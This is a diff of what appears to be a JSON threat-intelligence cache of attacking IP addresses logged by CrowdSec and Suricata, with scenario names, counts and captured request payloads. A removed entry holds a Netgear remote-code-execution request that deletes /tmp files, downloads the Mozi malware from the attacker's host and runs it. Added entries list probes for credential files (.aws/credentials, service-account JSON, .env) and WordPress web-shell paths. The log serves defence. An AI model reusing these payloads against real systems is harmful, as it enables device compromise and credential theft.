@@ -1,90 +1,8 @@
 {
   "schema_version": "2",
   "ttl_days": 7,
-  "updated_at": "2026-06-16T01:00:02.614259Z",
+  "updated_at": "2026-06-16T13:00:02.833137Z",
   "items": {
-    "219.71.131.225": {
-      "ip": "219.71.131.225",
-      "family": "v4",
-      "first_seen": "2026-06-09T09:59:39Z",
-      "last_seen": "2026-06-09T09:59:40Z",
-      "scenarios": {
-        "crowdsec/netgear_rce": {
-          "count": 1,
-          "last_seen": "2026-06-09T09:59:40Z"
-        },
-        "crowdsec/http-cve-probing": {
-          "count": 1,
-          "last_seen": "2026-06-09T09:59:39Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 2,
-          "first_seen": "2026-06-09T09:59:39Z",
-          "last_seen": "2026-06-09T09:59:40Z",
-          "last_alert_id": 7196,
-          "last_alert_uuid": "744adead-c334-4958-bf77-b416a7809e1c",
-          "payloads": [
-            "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://219.71.131.225:49112/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
-          ]
-        }
-      },
-      "asn": "9416",
-      "asn_prefix": "219.70.0.0/15"
-    },
-    "13.86.116.159": {
-      "ip": "13.86.116.159",
-      "family": "v4",
-      "first_seen": "2026-06-09T09:37:29Z",
-      "last_seen": "2026-06-09T09:37:29Z",
-      "scenarios": {
-        "crowdsec/http-technology-probing": {
-          "count": 1,
-          "last_seen": "2026-06-09T09:37:29Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-06-09T09:37:29Z",
-          "last_seen": "2026-06-09T09:37:29Z",
-          "last_alert_id": 7194,
-          "last_alert_uuid": "e67970bb-6b76-40d9-8bba-ed683245de5a",
-          "payloads": [
-            "GET /actuator/health"
-          ]
-        }
-      },
-      "asn": "8075",
-      "asn_prefix": "13.64.0.0/11"
-    },
-    "35.216.195.77": {
-      "ip": "35.216.195.77",
-      "family": "v4",
-      "first_seen": "2026-06-09T01:10:34Z",
-      "last_seen": "2026-06-09T01:10:34Z",
-      "scenarios": {
-        "crowdsec/http-technology-probing": {
-          "count": 1,
-          "last_seen": "2026-06-09T01:10:34Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-06-09T01:10:34Z",
-          "last_seen": "2026-06-09T01:10:34Z",
-          "last_alert_id": 7189,
-          "last_alert_uuid": "fbc2cbcc-c0db-49b9-88c0-10758b29f502",
-          "payloads": [
-            "GET /info.php"
-          ]
-        }
-      },
-      "asn": "15169",
-      "asn_prefix": "35.216.128.0/17"
-    },
     "34.154.5.79": {
       "ip": "34.154.5.79",
       "family": "v4",
@@ -1837,17 +1755,17 @@
       "last_seen": "2026-06-16T00:26:20Z",
       "scenarios": {
         "crowdsec/http-technology-probing": {
-          "count": 1,
+          "count": 2,
           "last_seen": "2026-06-16T00:26:20Z"
         },
         "suricata/ET SCAN Zmap User-Agent (Inbound)": {
-          "count": 1,
+          "count": 2,
           "last_seen": "2026-06-16T00:26:20Z"
         }
       },
       "sources": {
         "crowdsec": {
-          "count": 1,
+          "count": 2,
           "first_seen": "2026-06-16T00:26:20Z",
           "last_seen": "2026-06-16T00:26:20Z",
           "last_alert_id": 7431,
@@ -1857,7 +1775,7 @@
           ]
         },
         "suricata": {
-          "count": 1,
+          "count": 2,
           "first_seen": "2026-06-16T00:26:20Z",
           "last_seen": "2026-06-16T00:26:20Z",
           "sids": [
@@ -2180,13 +2098,13 @@
       "last_seen": "2026-06-16T00:08:11Z",
       "scenarios": {
         "suricata/ET SCAN Zmap User-Agent (Inbound)": {
-          "count": 1,
+          "count": 2,
           "last_seen": "2026-06-16T00:08:11Z"
         }
       },
       "sources": {
         "suricata": {
-          "count": 1,
+          "count": 2,
           "first_seen": "2026-06-16T00:08:11Z",
           "last_seen": "2026-06-16T00:08:11Z",
           "sids": [
@@ -2541,6 +2459,298 @@
             2221010
           ],
           "max_priority": 3
+        }
+      }
+    },
+    "34.140.126.56": {
+      "ip": "34.140.126.56",
+      "family": "v4",
+      "first_seen": "2026-06-16T06:50:41Z",
+      "last_seen": "2026-06-16T06:50:41Z",
+      "scenarios": {
+        "crowdsec/http-probing": {
+          "count": 1,
+          "last_seen": "2026-06-16T06:50:41Z"
+        },
+        "crowdsec/http-sensitive-files": {
+          "count": 1,
+          "last_seen": "2026-06-16T06:50:41Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 2,
+          "first_seen": "2026-06-16T06:50:41Z",
+          "last_seen": "2026-06-16T06:50:41Z",
+          "last_alert_id": 7441,
+          "last_alert_uuid": "97c2187b-288a-4022-ae6d-72dd991513f9",
+          "payloads": [
+            "GET /backend/.git/config",
+            "GET /app/.git/config",
+            "GET /frontend/.git/config",
+            "GET /.git/config",
+            "GET /api/.git/config",
+            "GET /v1/.git/config",
+            "GET /src/.git/config",
+            "GET /v2/.git/config",
+            "GET /v3/.git/config",
+            "GET /web/.git/config",
+            "GET /www/.git/config"
+          ]
+        }
+      }
+    },
+    "208.84.101.160": {
+      "ip": "208.84.101.160",
+      "family": "v4",
+      "first_seen": "2026-06-16T04:35:09Z",
+      "last_seen": "2026-06-16T04:35:09Z",
+      "scenarios": {
+        "crowdsec/http-crawl-non_statics": {
+          "count": 1,
+          "last_seen": "2026-06-16T04:35:09Z"
+        },
+        "crowdsec/http-sensitive-files": {
+          "count": 1,
+          "last_seen": "2026-06-16T04:35:09Z"
+        },
+        "crowdsec/http-probing": {
+          "count": 1,
+          "last_seen": "2026-06-16T04:35:09Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 3,
+          "first_seen": "2026-06-16T04:35:09Z",
+          "last_seen": "2026-06-16T04:35:09Z",
+          "last_alert_id": 7437,
+          "last_alert_uuid": "efb39a22-d9fd-4bd6-9614-b51c1611e82a",
+          "payloads": [
+            "GET /service-account-file.json",
+            "GET /google-cloud.json",
+            "GET /service_account.json",
+            "GET /google_credentials.json",
+            "GET /google-service-account.json",
+            "GET /wp-content/debug.log",
+            "GET /.aws/credentials",
+            "GET /.docker/config.json",
+            "GET /client_secrets.json",
+            "GET /src/.env",
+            "GET /",
+            "GET /app/credentials.json",
+            "GET /config/gcp-credentials.json",
+            "GET /config/service-account.json",
+            "GET /service-account-credentials.json",
+            "GET /serviceAccountCredentials.json",
+            "GET /gcloud-service-key.json",
+            "GET /keyfile.json",
+            "GET /gcp.json",
+            "GET /firebase-credentials.json"
+          ]
+        }
+      }
+    },
+    "104.28.196.56": {
+      "ip": "104.28.196.56",
+      "family": "v4",
+      "first_seen": "2026-06-16T02:02:12Z",
+      "last_seen": "2026-06-16T02:02:12Z",
+      "scenarios": {
+        "crowdsec/http-admin-interface-probing": {
+          "count": 1,
+          "last_seen": "2026-06-16T02:02:12Z"
+        },
+        "crowdsec/http-wordpress-scan": {
+          "count": 1,
+          "last_seen": "2026-06-16T02:02:12Z"
+        },
+        "crowdsec/http-probing": {
+          "count": 1,
+          "last_seen": "2026-06-16T02:02:12Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 3,
+          "first_seen": "2026-06-16T02:02:12Z",
+          "last_seen": "2026-06-16T02:02:12Z",
+          "last_alert_id": 7433,
+          "last_alert_uuid": "8f160215-3506-405e-b5aa-bb4e5d689561",
+          "payloads": [
+            "GET /wp-admin/admin-ajax.php",
+            "GET /wp-admin/css/index.php",
+            "GET /wp-admin/txets.php",
+            "GET /wp-content/plugins/hellopress/wp_mna.php",
+            "GET /wp-content/plugins/index.php",
+            "GET /ms-themes.php",
+            "GET /chosen.php?p=",
+            "GET /file.php",
+            "GET /flower.php",
+            "GET /gifclass.php",
+            "GET /bless.php",
+            "GET /class-t.api.php",
+            "GET /blurbs.php",
+            "GET /akcc.php",
+            "GET /abcd.php",
+            "GET /shelp.php"
+          ]
+        }
+      }
+    },
+    "172.189.127.20": {
+      "ip": "172.189.127.20",
+      "family": "v4",
+      "first_seen": "2026-06-16T05:54:28Z",
+      "last_seen": "2026-06-16T05:54:28Z",
+      "scenarios": {
+        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response": {
+          "count": 1,
+          "last_seen": "2026-06-16T05:54:28Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-06-16T05:54:28Z",
+          "last_seen": "2026-06-16T05:54:28Z",
+          "sids": [
+            2021076
+          ],
+          "max_priority": 2,
+          "payloads": [
+            "GET /d/msdownload/update/software/defu/2026/06/am_delta_patch_1.453.107.0_e055bbe226035e506dcb5e9c022d2d0e818f9a59.exe?cacheHostOrigin=3.au.download.windowsupdate.com"
+          ]
+        }
+      }
+    },
+    "217.154.159.73": {
+      "ip": "217.154.159.73",
+      "family": "v4",
+      "first_seen": "2026-06-16T04:18:51Z",
+      "last_seen": "2026-06-16T04:18:51Z",
+      "scenarios": {
+        "suricata/ET SCAN Laravel Debug Mode Information Disclosure Probe Inbound": {
+          "count": 1,
+          "last_seen": "2026-06-16T04:18:51Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-06-16T04:18:51Z",
+          "last_seen": "2026-06-16T04:18:51Z",
+          "sids": [
+            2034508
+          ],
+          "max_priority": 2,
+          "payloads": [
+            "POST /"
+          ]
+        }
+      }
+    },
+    "104.248.121.30": {
+      "ip": "104.248.121.30",
+      "family": "v4",
+      "first_seen": "2026-06-16T03:56:41Z",
+      "last_seen": "2026-06-16T03:56:41Z",
+      "scenarios": {
+        "suricata/ET SCAN Zmap User-Agent (Inbound)": {
+          "count": 1,
+          "last_seen": "2026-06-16T03:56:41Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-06-16T03:56:41Z",
+          "last_seen": "2026-06-16T03:56:41Z",
+          "sids": [
+            2029054
+          ],
+          "max_priority": 3,
+          "payloads": [
+            "GET /"
+          ]
+        }
+      }
+    },
+    "45.33.109.8": {
+      "ip": "45.33.109.8",
+      "family": "v4",
+      "first_seen": "2026-06-16T03:42:11Z",
+      "last_seen": "2026-06-16T03:42:11Z",
+      "scenarios": {
+        "suricata/ET SCAN Zmap User-Agent (Inbound)": {
+          "count": 1,
+          "last_seen": "2026-06-16T03:42:11Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-06-16T03:42:11Z",
+          "last_seen": "2026-06-16T03:42:11Z",
+          "sids": [
+            2029054
+          ],
+          "max_priority": 3,
+          "payloads": [
+            "GET /"
+          ]
+        }
+      }
+    },
+    "172.104.210.105": {
+      "ip": "172.104.210.105",
+      "family": "v4",
+      "first_seen": "2026-06-16T02:42:06Z",
+      "last_seen": "2026-06-16T02:42:06Z",
+      "scenarios": {
+        "suricata/ET SCAN Zmap User-Agent (Inbound)": {
+          "count": 1,
+          "last_seen": "2026-06-16T02:42:06Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-06-16T02:42:06Z",
+          "last_seen": "2026-06-16T02:42:06Z",
+          "sids": [
+            2029054
+          ],
+          "max_priority": 3,
+          "payloads": [
+            "GET /"
+          ]
+        }
+      }
+    },
+    "172.189.127.2": {
+      "ip": "172.189.127.2",
+      "family": "v4",
+      "first_seen": "2026-06-16T06:15:03Z",
+      "last_seen": "2026-06-16T06:15:03Z",
+      "scenarios": {
+        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response": {
+          "count": 1,
+          "last_seen": "2026-06-16T06:15:03Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-06-16T06:15:03Z",
+          "last_seen": "2026-06-16T06:15:03Z",
+          "sids": [
+            2021076
+          ],
+          "max_priority": 2,
+          "payloads": [
+            "GET /d/msdownload/update/software/defu/2026/06/am_delta_patch_1.453.105.0_b518a1a6f10d238b417b8e5933c28ead6a6628c3.exe?cacheHostOrigin=2.au.download.windowsupdate.com"
+          ]
         }
       }
     }
